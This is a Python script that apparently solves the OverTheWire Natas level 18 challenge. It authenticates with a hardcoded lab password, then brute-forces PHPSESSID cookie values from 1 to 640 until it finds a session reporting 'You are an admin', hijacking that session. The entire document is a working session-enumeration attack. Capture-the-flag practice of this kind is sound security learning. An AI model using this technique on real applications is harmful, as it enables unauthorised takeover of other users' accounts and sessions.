import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas18', 'fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op')
url = "http://natas18.natas.labs.overthewire.org/index.php"

for i in range(1, 641):
    cookies = {"PHPSESSID": str(i)}
    try:
        r = requests.get(url, auth=basicAuth, cookies=cookies, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"Request failed at {i}: {e}")
        continue

    if i % 50 == 0:
        print(f"...checked {i} so far")

    if "You are an admin" in r.text:
        print(f"Found admin session: {i}")
        print(r.text)
        break
else:
    print("No admin session found in range")

